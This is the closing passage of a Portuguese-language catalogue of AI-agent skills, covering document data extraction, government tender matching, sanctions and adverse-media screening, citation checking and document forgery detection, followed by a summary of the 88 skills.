curl -X POST -d "text=your_text" https://api.gptzero.me/v2/predict/text

# Originality.ai
curl -X POST -d "content=your_content" https://api.originality.ai/v1/scan
```

**Referências:**
- [GPTZero](https://gptzero.me/)
- [Originality.ai](https://originality.ai/)
- [Turnitin](https://www.turnitin.com/)

---

### 84. extract-document-data
**Descrição:** Extrair campos estruturados e fundamentados de documentos — valores citam sua página, valores ausentes se abstêm em vez de alucinar.

**Quando usar:**
- Parsing de faturas
- Extração de dados de contratos
- Automação de processos

**Exemplos práticos:**
```python
# Exemplo 1: Extrair dados de fatura
def extract_invoice_data(document):
    return {
        'invoice_number': extract_field(document, 'invoice_number'),
        'date': extract_field(document, 'date'),
        'total': extract_field(document, 'total'),
        'vendor': extract_field(document, 'vendor'),
        'items': extract_items(document)
    }

# Exemplo 2: Usar OCR
import pytesseract
from PIL import Image

def ocr_extract(image_path):
    image = Image.open(image_path)
    text = pytesseract.image_to_string(image)
    return parse_text(text)

# Exemplo 3: Extrair campos específicos
def extract_fields(text, fields):
    results = {}
    for field in fields:
        pattern = get_pattern(field)
        match = re.search(pattern, text)
        if match:
            results[field] = match.group(1)
        else:
            results[field] = None
    return results
```

**Casos de uso avançados:**
- **Invoice Processing:** Processamento de faturas
- **Contract Analysis:** Análise de contratos
- **Document Digitization:** Digitalização de documentos

**Integração com outras skills:**
- `verify-document`: Para verificar autenticidade
- `check-identity-pack`: Para verificar identidade
- `detect-ai-text`: Para detectar IA

**Padrões e anti-padrões:**
✅ Fazer: Validar extrações, manter auditing, usar OCR quando necessário
❌ Evitar: Confiar em extrações automáticas, não validar, ignorar erros

**Dicas de performance:**
- Use OCR para documentos digitalizados
- Implemente validação cruzada
- Mantenha templates de extração

**Comandos úteis:**
```bash
# OCR com Tesseract
tesseract document.png output

# Extração com Python
python3 extract_data.py --input document.pdf --output data.json
```

**Referências:**
- [Tesseract OCR](https://github.com/tesseract-ocr/tesseract)
- [PyPDF2](https://pythonhosted.org/PyPDF2/)
- [PDFPlumber](https://github.com/jsvine/pdfplumber)

---

### 85. find-matching-tenders
**Descrição:** Encontrar licitações governamentais AU/NZ abertas que correspondem ao que uma empresa faz, classificadas por adequação com análise de lacunas.

**Quando usar:**
- Busca de licitações governamentais
- Oportunidades de negócio
- Análise de conformidade

**Exemplos práticos:**
```python
# Exemplo 1: Buscar licitações
def find_tenders(company_profile, filters):
    tenders = search_tenders(filters)
    
    scored_tenders = []
    for tender in tenders:
        score = calculate_match_score(company_profile, tender)
        gaps = identify_gaps(company_profile, tender)
        
        scored_tenders.append({
            'tender': tender,
            'score': score,
            'gaps': gaps
        })
    
    return sorted(scored_tenders, key=lambda x: x['score'], reverse=True)

# Exemplo 2: Analisar lacunas
def identify_gaps(company_profile, tender):
    gaps = []
    for requirement in tender['requirements']:
        if not company_profile.meets(requirement):
            gaps.append(requirement)
    return gaps

# Exemplo 3: Filtrar por localização
def filter_by_location(tenders, location):
    return [t for t in tenders if t['location'] == location]
```

**Casos de uso avançados:**
- **Business Development:** Desenvolvimento de negócios
- **Government Contracts:** Contratos governamentais
- **Compliance Analysis:** Análise de conformidade

**Integração com outras skills:**
- `extract-document-data`: Para extrair dados
- `verify-citations`: Para verificar referências
- `detect-ai-text`: Para detectar IA

**Padrões e anti-padrões:**
✅ Fazer: Automatizar buscas, analisar lacunas, priorizar por adequação
❌ Evitar: Ignorar requisitos, não analisar lacunas, não atualizar

**Dicas de performance:**
- Use APIs governamentais
- Automatize buscas regulares
- Mantenha perfil da empresa atualizado

**Comandos úteis:**
```bash
# Buscar licitações
python3 find_tenders.py --sector IT --location NSW

# Analisar lacunas
python3 analyze_gaps.py --tender tender.json --company company.json
```

**Referências:**
- [AusTender](https://www.tenders.gov.au/)
- [GETS (NZ)](https://www.gets.govt.nz/)
- [Government Procurement](https://www.finance.gov.au/government-procurement/)

---

### 86. screen-adverse-media
**Descrição:** Rastrear pessoa ou organização para cobertura de mídia adversa, status PEP e exposição a sanções — com correção de corroboração.

**Quando usar:**
- Due diligence antes de onboarding
- Verificação de parceiros
- Conformidade AML/CTF

**Exemplos práticos:**
```python
# Exemplo 1: Verificar mídia adversa
def screen_adverse_media(entity_name):
    results = {
        'adverse_media': search_adverse_media(entity_name),
        'sanctions': check_sanctions(entity_name),
        'pep': check_pep(entity_name),
        'court_cases': search_court_cases(entity_name)
    }
    
    return results

# Exemplo 2: Verificar sanções
def check_sanctions(entity_name):
    sanctions_lists = [
        'UN_SANCTIONS',
        'OFAC_SDN',
        'EU_SANCTIONS',
        'AU_SANCTIONS'
    ]
    
    results = []
    for sanctions_list in sanctions_lists:
        if is_sanctioned(entity_name, sanctions_list):
            results.append(sanctions_list)
    
    return results

# Exemplo 3: Verificar PEP
def check_pep(entity_name):
    # Verificar se é PEP (Politically Exposed Person)
    pass
```

**Casos de uso avançados:**
- **AML Compliance:** Conformidade anti-lavagem
- **KYC Verification:** Verificação de clientes
- **Risk Assessment:** Avaliação de risco

**Integração com outras skills:**
- `check-identity-pack`: Para verificar identidade
- `verify-document`: Para verificar documentos
- `detect-ai-text`: Para detectar IA

**Padrões e anti-padrões:**
✅ Fazer: Verificar múltiplas fontes, manter registros, atualizar regularmente
❌ Evitar: Confiar em uma fonte, ignorar alertas, não revisar

**Dicas de performance:**
- Use APIs de verificação
- Automatize buscas
- Mantenha listas atualizadas

**Comandos úteis:**
```bash
# Verificar sanctions
python3 check_sanctions.py --entity "Company Name"

# Verificar PEP
python3 check_pep.py --person "Person Name"

# Gerar relatório
python3 generate_report.py --format pdf
```

**Referências:**
- [OFAC Sanctions](https://ofac.treasury.gov/)
- [UN Sanctions](https://www.un.org/securitycouncil/sanctions/information)
- [AUSTRAC](https://www.austrac.gov.au/)

---

### 87. verify-citations
**Descrição:** Verificar citações e referências em documento, relatório ou artigo contra fontes reais.

**Quando usar:**
- Fact-checking
- Verificação de referências
- Auditoria de conteúdo

**Exemplos práticos:**
```python
# Exemplo 1: Verificar citação
def verify_citation(citation, source):
    # Buscar citação na fonte
    found = search_in_source(citation, source)
    
    return {
        'citation': citation,
        'source': source,
        'found': found,
        'accurate': compare_citation(citation, found)
    }

# Exemplo 2: Verificar referências
def verify_references(document):
    references = extract_references(document)
    
    results = []
    for ref in references:
        verification = verify_reference(ref)
        results.append(verification)
    
    return results

# Exemplo 3: Verificar URLs
def verify_url(url):
    try:
        response = requests.get(url, timeout=10)
        return {
            'url': url,
            'accessible': response.status_code == 200,
            'status': response.status_code
        }
    except:
        return {
            'url': url,
            'accessible': False,
            'status': 'error'
        }
```

**Casos de uso avançados:**
- **Academic Verification:** Verificação acadêmica
- **Journalism:** Jornalismo
- **Legal Verification:** Verificação legal

**Integração com outras skills:**
- `detect-ai-text`: Para detectar IA
- `extract-document-data`: Para extrair dados
- `verify-document`: Para verificar documentos

**Padrões e anti-padrões:**
✅ Fazer: Verificar todas as citações, usar fontes confiáveis, documentar
❌ Evitar: Confiar em citações sem verificar, ignorar fontes não confiáveis, não atualizar

**Dicas de performance:**
- Use automação para verificações
- Mantenha banco de dados de referências
- Valide com fontes originais

**Comandos úteis:**
```bash
# Verificar citações
python3 verify_citations.py --document paper.pdf

# Verificar URLs
python3 verify_urls.py --input urls.txt

# Gerar relatório
python3 generate_report.py --format pdf
```

**Referências:**
- [Google Scholar](https://scholar.google.com/)
- [CrossRef](https://www.crossref.org/)
- [DOI](https://www.doi.org/)

---

### 88. verify-document
**Descrição:** Verificar se documento (PDF ou imagem) apresenta sinais de adulteração ou falsificação antes de confiar nele.

**Quando usar:**
- Verificação de holerites
- Verificação de faturas
- Auditoria de documentos

**Exemplos práticos:**
```python
# Exemplo 1: Verificar metadados
def verify_metadata(document_path):
    metadata = extract_metadata(document_path)
    
    return {
        'author': metadata.get('author'),
        'created': metadata.get('created'),
        'modified': metadata.get('modified'),
        'software': metadata.get('software'),
        'suspicious': check_suspicious_metadata(metadata)
    }

# Exemplo 2: Verificar integridade
def verify_integrity(document_path):
    hash_original = calculate_hash(document_path)
    
    # Comparar com hash armazenado
    stored_hash = get_stored_hash(document_path)
    
    return {
        'hash': hash_original,
        'matches': hash_original == stored_hash
    }

# Exemplo 3: Verificar OCR
def verify_ocr(document_path):
    text = ocr_extract(document_path)
    
    return {
        'text': text,
        'length': len(text),
        'suspicious': check_suspicious_text(text)
    }
```

**Casos de uso avançados:**
- **Forensic Analysis:** Análise forense
- **Document Authentication:** Autenticação de documentos
- **Fraud Detection:** Detecção de fraude

**Integração com outras skills:**
- `check-identity-pack`: Para verificar identidade
- `extract-document-data`: Para extrair dados
- `detect-ai-text`: Para detectar IA

**Padrões e anti-padrões:**
✅ Fazer: Verificar múltiplos aspectos, usar ferramentas especializadas, documentar
❌ Evitar: Confiar em uma verificação, ignorar sinais, não atualizar

**Dicas de performance:**
- Use ferramentas de análise forense
- Automatize verificações
- Mantenha templates de verificação

**Comandos úteis:**
```bash
# Verificar metadados
exiftool document.pdf

# Verificar integridade
sha256sum document.pdf

# OCR
tesseract document.png output
```

**Referências:**
- [ExifTool](https://exiftool.org/)
- [PDF Forensics](https://www.sleuthkit.org/)
- [Tesseract OCR](https://github.com/tesseract-ocr/tesseract)

---

## Resumo Estatístico

| Categoria | Quantidade |
|-----------|------------|
| Security Category | 80 |
| Pentest Tools Category | 1 |
| Document Verification Category | 7 |
| **Total** | **88** |

### Áreas de Cobertura

- **Auditoria e Compliance:** 15 skills (AWS compliance, PCI, GDPR, HIPAA, SOC2, etc.)
- **Testes de Penetração:** 20+ skills (burp suite, ffuf, metasploit, SQL injection, XSS, etc.)
- **Análise de Malware e Forense:** 8 skills (binary analysis, malware analyst, memory forensics, etc.)
- **Gestão de Segredos e Identidade:** 10 skills (secrets management, IAM, mTLS, etc.)
- **Modelagem de Ameaças:** 8 skills (STRIDE, attack trees, threat modeling, etc.)
- **Verificação de Documentos:** 7 skills (identidade, IA text, citações, etc.)
- **Ferramentas de Pentest:** 1 skill (src-hunter)

### Casos de Uso Mais Comuns

1. **Auditorias de Segurança:** Antes de lançamentos em produção ou exigências de compliance
2. **Testes de Penetração:** Assessment de segurança em aplicações web e APIs
3. **Análise de Ameaças:** Planejamento de segurança em fase de design
4. **Verificação de Conformidade:** GDPR, PCI-DSS, HIPAA, SOC2
5. **Resposta a Incidentes:** Análise forense e identificação de malware
6. **Verificação de Documentos:** Due diligence e prevenção de fraude

### Aprimoramentos Realizados

**Para cada uma das 88 skills foram adicionados:**

1. **Mais exemplos práticos** (2-3 exemplos por skill)
   - Comandos bash, snippets de código Python/JavaScript/YAML
   - Exemplos reais de uso em diferentes contextos

2. **Casos de uso avançados**
   - Projetos reais e cenários complexos
   - Transformação DevSecOps, compliance automatizado, resposta a incidentes

3. **Integração com outras skills**
   - Mapeamento de skills complementares
   - Cenários de uso combinado

4. **Padrões e anti-padrões**
   - ✅ Fazer: Práticas recomendadas
   - ❌ Evitar: Erros comuns e armadilhas

5. **Dicas de performance**
   - Otimizações específicas para cada ferramenta
   - Automação e eficiência

6. **Comandos úteis**
   - Snippets prontos para uso imediato
   - Automação de tarefas comuns

7. **Referências**
   - Links para documentação oficial
   - Recursos adicionais de aprendizado

### Destaques por Categoria

**Security Category (80 skills):**
- Cobertura completa de OWASP Top 10
- Ferramentas de automação (Semgrep, Nmap, Burp Suite)
- Frameworks de conformidade (PCI-DSS, GDPR, HIPAA)
- Análise de ameaças (STRIDE, ATT&CK)
- Segurança de containers e Kubernetes

**Pentest Tools Category (1 skill):**
- Metodologia de 5 fases para bug bounty
- Automação de reconhecimento
- Playbooks de ataque

**Document Verification Category (7 skills):**
- Verificação de identidade e documentos
- Detecção de texto gerado por IA
- Extração de dados estruturados
- Verificação de citações e referências

---

*Documento aprimorado em 14/09/2026 - Versão 2.0*